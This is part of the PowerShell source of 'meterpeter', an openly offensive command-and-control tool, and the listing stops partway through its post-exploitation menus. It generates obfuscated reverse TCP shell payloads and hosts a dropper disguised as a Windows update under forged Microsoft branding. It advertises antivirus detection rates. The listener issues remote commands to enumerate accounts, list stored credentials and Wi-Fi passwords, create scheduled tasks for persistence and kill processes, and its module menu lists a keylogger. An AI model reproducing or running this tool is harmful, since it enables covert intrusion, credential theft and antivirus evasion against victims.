<#
.SYNOPSIS
  Starts a listener Server on Windows|Linux and generates reverseshellS

  Author: @ZHacker13 &('r00t-3xp10it')
  Required Dependencies: None
  Optional Dependencies: Python3 (windows)|Apache2 (Linux)
  PS Script Dev Version: v2.10.11

.DESCRIPTION
   This PS1 starts a listener Server on a Windows|Linux attacker machine and generates oneline
   reverse tcp shell payloads (In PowerShell) to be executed on the victim machine. You can also
   recive the remote connection via netcat. (In this case you will lose the C2 functionalities
   like: upload|download files, screenshot, keylogger, post-exploit, Advanced Information, etc)

.NOTES
   meterpeter server creates one PS script (payload) and one dropper.bat (Launcher) then compress (zip)
   the dropper and copy it to apache2 (On Linux) or Python3 http.server (On Windows) working directory,
   then creates one URL (dropper.zip) for attacker to be abble to deliver the payload under LAN networks.

.EXAMPLE
   PS C:\> Get-Help ./meterpeter.ps1 -full
   Access This cmdlet Comment_Based_Help

.EXAMPLE
   PS C:\> ./meterpeter.ps1
   Execute meterpeter C2 Server
 
.INPUTS
   None. You cannot pipe objects to meterpeter.ps1

.OUTPUTS
   Saves Update-KB4524147.ps1 (reverse tcp shell) to meterpeter working directory.

 .LINK
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/ZHacker13/ReverseTCPShell
#>

$CmdLetVersion = "2.10.10"
function Char_Obf($String){

  $String = $String.toCharArray();  
  ForEach($Letter in $String){
    $RandomNumber = (1..2) | Get-Random;
    
    If($RandomNumber -eq "1"){
      $Letter = "$Letter".ToLower();
    }

    If($RandomNumber -eq "2"){
      $Letter = "$Letter".ToUpper();
    }

    $RandomString += $Letter;
    $RandomNumber = $Null;
  }
  
  $String = $RandomString;
  Return $String;
}


function Var_Obfusc($String){

  $RandomVariable = (0..99);
  For($i = 0; $i -lt $RandomVariable.count; $i++){

    $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));

    While($RandomVariable -like "$Temp"){
      $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));
    }

    $RandomVariable[$i] = $Temp;
    $Temp = $Null;
  }

  $RandomString = $String;

  For($x = $RandomVariable.count; $x -ge 1; $x--){
  	$Temp = $RandomVariable[$x-1];
    $RandomString = "$RandomString" -replace "\`$$x", "`$$Temp";
  }

  $String = $RandomString;
  Return $String;
}


function XOR_Obfuscation($String){


  $CMD = "ECHO hello world";
  $PowerShell = "I`E`X(-Join((@)|%{[char](`$_-BXOR #)}));Exit";

  $Key = '0x' + ((0..5) | Get-Random) + ((0..9) + ((65..70) + (97..102) | % {[char]$_}) | Get-Random);
  $String = ([System.Text.Encoding]::ASCII.GetBytes($String) | % {$_ -BXOR $Key}) -join ',';
  
  $PowerShell = Char_Obf($PowerShell);
  $PowerShell = $PowerShell -replace "@","$String";
  $PowerShell = $PowerShell -replace "#","$Key";

  $CMD = Char_Obf($CMD);
  $CMD = $CMD -replace "@","$String";
  $CMD = $CMD -replace "#","$Key";

  Return $PowerShell,$CMD;
}


$Modules = @"

  __  __  ____  _____  ____  ____  ____  ____  _____  ____  ____ 
 |  \/  || ===||_   _|| ===|| () )| ()_)| ===||_   _|| ===|| () )
 |_|\/|_||____|  |_|  |____||_|\_\|_|   |____|  |_|  |____||_|\_\
      Author: @ZHacker13 &('r00t-3xp10it') - SSAredTeam @2020


 - | Modules     | - Show C2-Server Modules.
 - | Info        | - Show Remote-Host System Info.
 - | AdvInfo     | - Advanced Remote-Host system Info.
 - | Session     | - Retrieve C2-Server Connection Status.
 - | Settings    | - Retrieve Server/Client active settings
 - | Upload      | - Upload File from Local-Host to Remote-Host.
 - | Download    | - Download File from Remote-Host to Local-Host.
 - | Screenshot  | - Save Screenshot from Remote-Host to Local-Host.
 - | keylogger   | - Install Remote-Host Keylogger to capture keystrokes.
 - | PostExploit | - Post-Exploitation Modules (red-team)
 - | exit        | - Exit Reverse TCP Shell (Server+Client).

"@;


#Optional settings (manual configuration)
$ManualWorkingDir = "False" #Spawn a msgbox to sellect meterpeter working directory?
$BatToExe = "False"         #Convert the client.ps1 script to standalone executable?


function Payload($IP,$Port,$Base64_Key){

  $dadoninho = "FromBa"+"se64String" -Join ''
  $opbypas = "`$1=[System.Byte[]]::Creat" + "eInstance([System.Byte],10" + "24);`$2=([Convert]::$dadoninho(`"@`"))" -Join ''
  $fdsrsr = "$opbypas;`$3=`"#`";`$4=I`E`X([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR((`$3|ConvertTo-SecureString -Key `$2))));While(`$5=`$4.GetStream()){;While(`$5.DataAvailable -or `$6 -eq `$1.count){;`$6=`$5.Read(`$1,0,`$1.length);`$7+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$1,0,`$6)};If(`$7){;`$8=(IEX(`$7)2>&1|Out-String);If(!(`$8.length%`$1.count)){;`$8+=`" `"};`$9=([text.encoding]::ASCII).GetBytes(`$8);`$5.Write(`$9,0,`$9.length);`$5.Flush();`$7=`$Null}}";

  $Key = $([Convert]::$dadoninho($Base64_Key))
  $C2 = ConvertTo-SecureString "New-Object System.Net.Sockets.TCPClient('$IP','$Port')" -AsPlainText -Force | ConvertFrom-SecureString -Key $Key;

  $fdsrsr = Var_Obfusc(Char_Obf($fdsrsr));
  $fdsrsr = $fdsrsr -replace "@","$Base64_Key";
  $fdsrsr = $fdsrsr -replace "#","$C2";

  Return $fdsrsr;
}


Clear-Host;
Write-Host $Modules;
## Venom v1.0.16 function
# Auto-Venom-Settings {Agent nº 5}
$DISTRO_OS = pwd|Select-String -Pattern "/" -SimpleMatch; # <-- (check IF windows|Linux Separator)
If($DISTRO_OS){
  ## Linux Distro
  $IPATH = "$pwd/";
  $Flavor = "Linux";
  $Bin = "$pwd/mimiRatz/";
  $APACHE = "/var/www/html/";
}Else{
  ## Windows Distro
  If($ManualWorkingDir -ieq "True")
  {

     <#
     .SYNOPSIS
        Author: @r00t-3xp10it
        Helper - Spawn a msgbox to sellect meterpeter working directory?
     #>

     #Build dialogbox (Grafical User Interface)
     [System.Reflection.Assembly]::LoadWithPartialName("System.windows.forms")|Out-Null
     $OpenDirectoryDialog = New-Object Windows.Forms.FolderBrowserDialog
     #Spawn DialogBox (Grafical User Interface)
     $OpenDirectoryDialog.ShowDialog()|Out-Null
     #Store absolucte path on $IPATH PS variable
     $IPATH = $OpenDirectoryDialog.SelectedPath + "\" -Join ''

  }
  Else
  {

     #Use meterpeter.ps1 location as working directory!
     $IPATH = "$pwd\";
  }

  $Flavor = "Windows";
  $Bin = "$pwd\mimiRatz\";
  $APACHE = "$env:LocalAppData\webroot\";
}
$HTTP_PORT = "8083";
$Obfuscation = $False;
$Settings = "Settings.txt";
$payload_name = "Update-KB4524147";
$Dropper_Name = "Update-KB4524147";
$Conf_File = "$IPATH$Settings";
If([System.IO.File]::Exists($Conf_File)){
  ## Read Settings From Venom Settings.txt File..
  $LHOST = Get-content $IPATH$Settings|Select-String "IP:"
  $parse = $LHOST -replace "IP:","";$Local_Host = $parse -replace " ","";
  $LPORT = Get-content $IPATH$Settings|Select-String "PORT:"
  $parse = $LPORT -replace "PORT:","";$Local_Port = $parse -replace " ","";
  $OBFUS = Get-content $IPATH$Settings|Select-String "OBFUS:"
  $parse = $OBFUS -replace "OBFUS:","";$Obfuscation = $parse -replace " ","";
  $HTTPP = Get-content $IPATH$Settings|Select-String "HTTPSERVER:"
  $parse = $HTTPP -replace "HTTPSERVER:","";$HTTP_PORT = $parse -replace " ","";
}Else{
  ## User Input Land ..
  Write-Host "`n - Local Host: " -NoNewline;
  $LHOST = Read-Host;
  $Local_Host = $LHOST -replace " ","";
  Write-Host " - Local Port: " -NoNewline;
  $LPORT = Read-Host;
  $Local_Port = $LPORT -replace " ","";
}
## Default settings
If(-not($Local_Port)){$Local_Port = "666"};
If(-not($Local_Host)){
   If($DISTRO_OS){
      ## Linux Flavor
      $Local_Host = ((ifconfig | grep [0-9].\.)[0]).Split()[-1]
   }else{
      ## Windows Flavor
      $Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
   }
}

If($Flavor -ieq "Windows")
{
   Write-Host "`n`n* Payload dropper extension sellection!" -ForegroundColor Black -BackgroundColor Gray
   Write-Host "Id DropperFileName       Format      Detection"
   Write-Host "-- ---------------       ------      ---------"
   Write-Host "1  Update-KB4524147.bat  Batch       0/54"
   Write-Host "2  Update-KB4524147.exe  Executable  2/54"
   $FlavorSellection = Read-Host "Id"
   If($FlavorSellection -eq 2){$BatToExe = "True"}
}
## End Of venom Function ..


$Key = (1..32 | % {[byte](Get-Random -Minimum 0 -Maximum 255)});
$Base64_Key = [Convert]::ToBase64String($Key);

Write-Host "`n[*] Generating Payload ..";
$fdsrsr = Payload -IP $Local_Host -Port $Local_Port -Base64_Key $Base64_Key;

Write-Host "[*] Obfuscation Type: BXOR"
$fdsrsr = XOR_Obfuscation($fdsrsr);
Start-Sleep -Seconds 2

Clear-Host;
Write-Host $Modules;
Write-Host " - Payload: $payload_name.ps1";
Write-Host " - Local Host: $Local_Host";
Write-Host " - Local Port: $Local_Port";

$PowerShell_Payload = $fdsrsr[0];
$CMD_Payload = $fdsrsr[1];

Write-Host "`n[*] PowerShell Payload:`n"
Write-Host "$PowerShell_Payload" -ForeGroundColor black -BackGroundColor white


write-host "`n`n";
Start-Sleep -Seconds 2;
## venom v1.0.16 function
# Copy payload to apache2 to trigger attack vector.
$My_Output = "$PowerShell_Payload" | Out-File -FilePath $IPATH$payload_name.ps1 -Force;
((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "IEX","I``E``X")|Set-Content -Path $IPATH$payload_name.ps1

$check = Test-Path -Path "/var/www/html/";
If($check -ieq $False)
{
  ## Check Attacker python version (http.server)
  $Python_version = python -V|Select-String "3."
  If($Python_version)
  {
    $Webroot_test = Test-Path -Path "$env:LocalAppData\webroot\";
    If($Webroot_test -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\";mkdir $APACHE|Out-Null}else{mkdir $APACHE|Out-Null};
    $Server_port = "$Local_Host"+":"+"$HTTP_PORT";
    ## Attacker: Windows - with python3 installed
    # Deliver Dropper.zip using python http.server
    write-Host "   WebServer    Client                 Dropper                WebRoot" -ForegroundColor Green;
    write-Host "   ---------    ------                 -------                -------";
    write-Host "   Python3      Update-KB4524147.ps1   Update-KB4524147.zip   $APACHE";write-host "`n`n";
    Copy-Item -Path $IPATH$payload_name.ps1 -Destination $APACHE$payload_name.ps1 -Force

    If($BatToExe -ieq "True")
    {

       cd $Bin
       $Dropper_Bat = "Update.ps1"
       $Dropper_Exe = "Update-KB4524147.exe"
       ((Get-Content -Path "$Dropper_Bat" -Raw) -Replace "CharlieBrown","$Server_port")|Set-Content -Path "$Dropper_Bat"
       ((Get-Content -Path "$Dropper_Bat" -Raw) -Replace "CleanLogs=`"False`"","CleanLogs=`"True`"")|Set-Content -Path "$Dropper_Bat"

       #Download the required files from my GITHUB meterpeter repository!
       iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/PS2EXE/ps2exe.ps1" -OutFile "ps2exe.ps1"|Out-Null
       iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/PS2EXE/meterpeter.ico" -OutFile "meterpeter.ico"|Out-Null

       $RunEXElevated = Read-Host "[i] Make dropper spawn UAC dialog to run in a elevated context? (yes|no)"
       If($RunEXElevated -iMatch '^(y|yes)$')
       {
          .\ps2exe.ps1 -inputFile "$Dropper_Bat" -outputFile "$Dropper_Exe" -iconFile "meterpeter.ico" -title "Cumulative KB Update" -version "45.19041.999.2" -copyright "©Microsoft Corporation. All Rights Reserved" -product "Update-KB4524147_0" -noError -noConsole -requireAdmin|Out-Null
          Start-Sleep -Seconds 2
       }
       Else
       {
          .\ps2exe.ps1 -inputFile "$Dropper_Bat" -outputFile "$Dropper_Exe" -iconFile "meterpeter.ico" -title "Cumulative KB Update" -version "45.19041.999.2" -copyright "©Microsoft Corporation. All Rights Reserved" -product "Update-KB4524147_0" -noError -noConsole|Out-Null
          Start-Sleep -Seconds 2
       }

       #Compress EXE executable and port the ZIP archive to 'webroot' directory!
       Compress-Archive -LiteralPath "$Dropper_Exe" -DestinationPath "$APACHE$Dropper_Name.zip" -Force

       #Revert meterpeter EXE template to default state, after successfully created\compressed the binary dropper (PE)
       ((Get-Content -Path "$Dropper_Bat" -Raw) -Replace "$Server_port","CharlieBrown")|Set-Content -Path "$Dropper_Bat"
       ((Get-Content -Path "$Dropper_Bat" -Raw) -Replace "CleanLogs=`"True`"","CleanLogs=`"False`"")|Set-Content -Path "$Dropper_Bat"

       #Clean all artifacts left behind by this function!
       Remove-Item -Path "meterpeter.ico" -EA SilentlyContinue -Force
       Remove-Item -Path "$Dropper_Exe" -EA SilentlyContinue -Force
       Remove-Item -Path "ps2exe.ps1" -EA SilentlyContinue -Force
       cd $IPATH
    }
    Else
    {
       ## (ZIP + add LHOST) to dropper.bat before send it to apache 2 webroot ..
       ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "CharlieBrown","$Server_port")|Set-Content -Path $Bin$Dropper_Name.bat
       Compress-Archive -LiteralPath $Bin$Dropper_Name.bat -DestinationPath $APACHE$Dropper_Name.zip -Force
       ((Get-Content -Path "$Bin$Dropper_Name.bat" -Raw) -Replace "$Server_port","CharlieBrown")|Set-Content -Path "$Bin$Dropper_Name.bat"
    }

    write-Host "[*] Send the URL generated to target to trigger download.";
    Write-Host "[i] Attack Vector: http://$Server_port/$Dropper_Name.zip" -ForeGroundColor Black -BackGroundColor white;
    ## Start python http.server (To Deliver Dropper/Payload)
    Start-Process powershell.exe "write-host `" [http.server] Close this Terminal After receving the connection back in meterpeter ..`" -ForeGroundColor red -BackGroundColor Black;cd $APACHE;python -m http.server $HTTP_PORT --bind $Local_Host";
  }else{
    ## Attacker: Windows - without python3 installed
    # Manualy Deliver Dropper.ps1 To Target Machine
    write-Host "   WebServer      Client                 Local Path" -ForegroundColor Green;
    write-Host "   ---------      ------                 ----------";
    write-Host "   NotInstalled   Update-KB4524147.ps1   $IPATH";write-host "`n`n";
    Write-Host "[i] Manualy Deliver '$payload_name.ps1' (Client) to Target .." -ForeGroundColor Black -BackGroundColor white;
    Write-Host "[*] [Remark] Install Python3 (http.server) to Deliver payloads .." -ForeGroundColor yellow;
  }
}else{
  ## Attacker: Linux - Apache2 webserver
  # Deliver Dropper.zip using Apache2 webserver
  write-Host "   WebServer    Client                 Dropper                WebRoot" -ForegroundColor Green;
  write-Host "   ---------    ------                 -------                -------";
  write-Host "   Apache2      Update-KB4524147.ps1   Update-KB4524147.zip   $APACHE";write-host "`n`n";
  Copy-Item -Path $IPATH$payload_name.ps1 -Destination $APACHE$payload_name.ps1 -Force;
  ## (ZIP + add LHOST) to dropper.bat before send it to apache 2 webroot ..
  ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "CharlieBrown","$Local_Host")|Set-Content -Path $Bin$Dropper_Name.bat;
  Compress-Archive -LiteralPath $Bin$Dropper_Name.bat -DestinationPath $APACHE$Dropper_Name.zip -Force;
  ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "$Local_Host","CharlieBrown")|Set-Content -Path $Bin$Dropper_Name.bat;
  write-Host "[*] Send the URL generated to target to trigger download."
  Write-Host "[i] Attack Vector: http://$Local_Host/$Dropper_Name.zip" -ForeGroundColor Black -BackGroundColor white;
}
$check = $Null;
$python_port = $Null;
$Server_port = $Null;
$Python_version = $Null;
## End of venom function


$Bytes = [System.Byte[]]::CreateInstance([System.Byte],1024);
Write-Host "[*] Listening on Port: $Local_Port";
$Socket = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$Local_Port);
$Socket.Start();
$Client = $Socket.AcceptTcpClient();
$Remote_Host = $Client.Client.RemoteEndPoint.Address.IPAddressToString;
Write-Host "[*] Connection: $Remote_Host" -ForegroundColor Green;
$Stream = $Client.GetStream();

$WaitData = $False;
$Info = $Null;

$System = Char_Obf("(Get-WmiObject Win32_OperatingSystem).Caption");
$Version = Char_Obf("(Get-WmiObject Win32_OperatingSystem).Version");
$Architecture = Char_Obf("(Get-WmiObject Win32_OperatingSystem).OSArchitecture");
$Name = Char_Obf("(Get-WmiObject Win32_OperatingSystem).CSName");
$WindowsDirectory = Char_Obf("(Get-WmiObject Win32_OperatingSystem).WindowsDirectory");
$serial = Char_Obf("(Get-WmiObject Win32_OperatingSystem).SerialNumber");
$syst_dir = Char_Obf("(Get-WmiObject Win32_OperatingSystem).SystemDirectory");
$Processor = Char_Obf("(Get-WmiObject Win32_processor).Caption");

$Command = "`"`n   RHost         : `"+`"$Remote_Host`"+`"``n   System        : `"+$System+`"``n   Version       : `"+$Version+`"``n   Architecture  : `"+$Architecture+`"``n   DomainName    : `"+$Name+`"``n   WindowsDir    : `"+$WindowsDirectory+`"``n   SystemDir     : `"+$syst_dir+`"``n   SerialNumber  : `"+$serial+`"``n   ProcessorCPU  : `"+$Processor;cd `$env:tmp";


While($Client.Connected)
{
  If(-not ($WaitData))
  {
    If(-not ($Command))
    {
      $Flipflop = "False";
      Write-Host "`n`n - press 'Enter' to continue .." -NoNewline;
      $continue = Read-Host;
      Clear-Host;
      Write-Host $Modules;
      Write-Host "`n :meterpeter> " -NoNewline -ForeGroundColor Green;
      $Command = Read-Host;
    }

    ## venom v1.0.16 function
    If($Command -ieq "-s" -or $Command -ieq "--settings" -or $Command -ieq "settings")
    {
      $Parse = "$IPATH"+"meterpeter.ps1"
      $SerSat = "$Local_Host"+":"+"$Local_Port";
      $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
      If(-not($bool)){$SerPrivileges = "UserLand"}else{$SerPrivileges = "SYSTEM"}
      write-host "`n`n Server Settings" -ForegroundColor green;
      write-host " ---------------";
      write-host " meterpeter dev        : $CmdLetVersion";
      write-host " Local Architecture    : $env:PROCESSOR_ARCHITECTURE";
      write-host " Obfuscation Settings  : BXOR";
      write-host " Server Privileges     : $SerPrivileges";
      write-host " Attacker OS flavor    : $Flavor Distro";
      write-host " Lhost|Lport Settings  : $SerSat";
      write-host " meterpeter WebServer  : $APACHE";
      write-host " meterpeter Server     : $Parse";
    }

    ## venom v1.0.16 function
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ## AdvInfo secondary menu
      write-host "`n`n   Modules   Description" -ForegroundColor green;
      write-host "   -------   -----------";
      write-host "   ListAdm   List ClientShell Path|Privs";
      write-host "   ListAcc   List Remote-Host Account(s)";
      write-host "   ListSID   List Remote-Host Group Acc";
      write-host "   ListDriv  List Remote-Host Active Drives";
      write-host "   ListSMB   List Remote-Host SMB shares";
      write-host "   ListApp   List Remote-Host Installed App";
      write-host "   ListTask  List Remote-Host Schedule Tasks";
      write-host "   ListProc  List Remote-Host Processes status";
      write-host "   ListAVP   List Remote-Host AV Product Name";
      write-host "   ListRece  List Remote-Host Recent Folder";
      write-host "   StartUp   List Remote-Host StartUp Folder";
      write-host "   ListRun   List Remote-Host Startup Run Entrys";
      write-host "   ListPriv  List Remote-Host Folder Permissions";
      write-host "   ListCred  List Remote-Host cmdkey store creds";
      write-host "   ListDNS   List Remote-Host DomainNameSytem Entrys";
      write-host "   ListConn  List Remote-Host Active TCP Connections";
      write-host "   ListIpv4  List Remote-Host IPv4 Network Statistics";
      write-host "   ListWifi  List Remote-Host Profiles/SSID/Passwords";
      write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
      write-host "`n`n :meterpeter:Adv> " -NoNewline -ForeGroundColor Green;
      $choise = Read-Host;
      ## Runing sellected Module.
      If($choise -ieq "ListAdm" -or $choise -ieq "adm")
      {
        write-host " List Client Shell Privileges (remote)." -ForeGroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n";
        $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   Client Shell:  `$ Running As ADMINISTRATOR `$ `" `> Priv.txt;`$a = (Get-location).Path;echo `"   Working Dir :  `$a`" `>`> Priv.txt;Get-Content Priv.txt;Remove-Item Priv.txt -Force}Else{echo `"   Client Shell:  * UserLand Privileges * `" `> Priv.txt;`$a = (Get-location).Path;echo `"   Working Dir :  `$a`" `>`> Priv.txt;Get-Content Priv.txt;Remove-Item Priv.txt -Force}";
      }
      If($choise -ieq "ListAcc" -or $choise -ieq "acc")
      {
        write-host " List of Remote-Host Accounts." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "Get-LocalUser|Select-Object Name,Enabled,Description > users.txt;Get-Content users.txt;remove-item users.txt -Force";
      }
      If($choise -ieq "ListSID" -or $choise -ieq "sid")
      {
        write-host " List of Remote-Host Groups Available (SID)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        ## $Command = "wmic useraccount get Name,Caption,Disabled,PasswordRequired,SID,Status `> LocalSID.txt;(Get-Content ./LocalSID.txt).Trim() | Where-Object{`$_.length -gt 0}|Set-Content ./LocalSID.txt;Get-content LocalSID.txt;Remove-Item LocalSID.txt -Force";
        $Command = "Get-LocalUser|Select-Object -Property Name,SID,Enabled,PasswordRequired,LastLogon|ft `> LocalSID.txt;Get-content LocalSID.txt;Remove-Item LocalSID.txt -Force";
      }
      If($choise -ieq "ListDriv" -or $choise -ieq "driv")
      {
        write-host " List of Remote-Host Drives Available." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "Get-PSDrive -PSProvider 'FileSystem'|Select-Object Name,Used,Free,Root|Format-Table `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
      }
      If($choise -ieq "ListSMB" -or $choise -ieq "smb")
      {
        write-host " List of Remote-Host SMB Shares." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "Get-SmbShare|Select-Object Name,Path,Description > smb.txt;Get-Content smb.txt;remove-item smb.txt -Force";
      }
      If($choise -ieq "ListApp" -or $choise -ieq "app")
      {
        write-host " List of Remote-Host Applications Installed." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize";
      }
      If($choise -ieq "ListTask" -or $choise -ieq "task")
      {
        write-host "`n   Warnning" -ForegroundColor Yellow;
        write-host "   --------";
        write-host "   In some targets schtasks service is configurated";
        write-host "   To not run any task IF connected to the battery";
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     -------";
        write-host "   Check     Retrieve Schedule Tasks         Client:User  - Privileges Required";
        write-host "   Inform    Advanced Info Single Task       Client:User  - Privileges Required";
        write-host "   Create    Create Remote-Host New Task     Client:User  - Privileges Required";
        write-host "   Delete    Delete Remote-Host Single Task  Client:User  - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Adv:Task> " -NoNewline -ForeGroundColor Green;
        $my_choise = Read-Host;
        If($my_choise -ieq "Check" -or $my_choise -ieq "check")
        {
          write-host " List of Remote-Host Schedule Tasks." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          write-host "TaskName                                 Schedule               Status" -ForegroundColor green;
          write-host "--------                                 --------               ------";
          $Command = "cmd /R schtasks|findstr `"Ready Running`" `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] None schedule Task found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";
        }
        If($my_choise -ieq "Inform" -or $my_choise -ieq "info")
        {
          write-Host " - Input TaskName: " -NoNewline;
          $TaskName = Read-Host;
          If(-not($TaskName)){$TaskName = "BgTaskRegistrationMaintenanceTask"}
          write-host " Retriving '$TaskName' Task Verbose Information ." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "cmd /R schtasks /Query /tn `"$TaskName`" /v /fo list `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] None schedule Task found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";
        }
        If($my_choise -ieq "Create" -or $my_choise -ieq "Create")
        {
          write-Host " - Input TaskName to create: " -NoNewline;
          $TaskName = Read-Host;
          write-Host " - Input Interval (in minuts): " -NoNewline;
          $Interval = Read-Host;
          write-Host " - Task Duration (from 1 TO 9 Hours): " -NoNewline;
          $userinput = Read-Host;
          $Display_dur = "$userinput"+"Hours";$Task_duration = "000"+"$userinput"+":00";
          write-host " Examples: 'cmd /c start calc.exe' [OR] '`$env:tmp\dropper.bat'" -ForegroundColor Blue -BackGroundColor White;
          write-Host " - Input Command|Binary Path: " -NoNewline;
          $execapi = Read-Host;
          If(-not($Interval)){$Interval = "10"}
          If(-not($userinput)){$userinput = "1"}
          If(-not($TaskName)){$TaskName = "METERPETER"}
          If(-not($execapi)){$execapi = "cmd /c start calc.exe"}
          write-host "[*] This task wil have the max duration of $Display_dur" -ForegroundColor green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$TaskName`" /tr `"$execapi`" /du $Task_duration;schtasks /Query /tn `"$TaskName`" `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to create Task in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";
        }
        If($my_choise -ieq "Delete" -or $my_choise -ieq "Delete")
        {
          write-Host " - Input TaskName: " -NoNewline -ForeGroundColor Red;
          $TaskName = Read-Host;
          If(-not($TaskName)){$TaskName = "METERPETER"}
          write-host " Deleting Remote '$TaskName' Task." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "cmd /R schtasks /Delete /tn `"$TaskName`" /f `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] None Task Name: $TaskName found ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";  
        }
        If($my_choise -ieq "Return" -or $my_choise -ieq "return" -or $my_choise -ieq "cls" -or $my_choise -ieq "Modules" -or $my_choise -ieq "modules" -or $my_choise -ieq "clear")
        {
          $Command = $Null;
          $my_choise = $Null;
        }
      }
      If($choise -ieq "ListProc" -or $choise -ieq "proc")
      {
        write-host "`n`n   Modules   Description                        Remark" -ForegroundColor green;
        write-host "   -------   -----------                        ------";
        write-host "   Check     List Remote Processe(s) Running    Client:User  - Privileges Required";
        write-host "   KillProc  Kill Remote Process From Running   Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Adv:Proc> " -NoNewline -ForeGroundColor Green;
        $wifi_choise = Read-Host;
        If($wifi_choise -ieq "Check" -or $wifi_choise -ieq "check")
        {
        write-host " List of Remote-Host Processe(s) Runing." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "Get-Process|Select-Object Name,Path,Company,Product,StartTime `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve Process List ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($wifi_choise -ieq "KillProc" -or $wifi_choise -ieq "kill")
        {
          Write-Host " - Process Name: " -NoNewline -ForeGroundColor Red;
          $Proc_name = Read-Host;
          If(-not ($proc_name) -or $Proc_name -ieq " ")
          {
            write-host " [warning] We need To Provide A ProcessName!" -ForegroundColor Red -BackGroundColor white;
            write-host " [Usage] meterpeter> AdvInfo -> ListProc -> KillProc (to Kill Process)." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
            Start-Sleep -Seconds 4;
            $Command = $Null;
            $Proc_name = $Null;
          }else{
            ## cmd.exe /c taskkill /F /IM $Proc_name
            write-host " Kill Remote-Host Process $Proc_name From Runing." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R taskkill /F /IM $Proc_name `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
          }
       }
        If($wifi_choise -ieq "Return" -or $wifi_choise -ieq "return" -or $wifi_choise -ieq "cls" -or $wifi_choise -ieq "Modules" -or $wifi_choise -ieq "modules")
        {
          $Command = $Null;
        }
      }
      If($choise -ieq "ListAVP" -or $choise -ieq "avp")
      {
        write-host " List Installed AV ProductName." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "`$wmiQuery = `"SELECT * FROM AntiVirusProduct`";`$AntivirusProduct = Get-WmiObject -Namespace `"root\SecurityCenter2`" -Query `$wmiQuery `> Dav.txt;Get-Content Dav.txt;remove-item Dav.txt -Force";
      }    
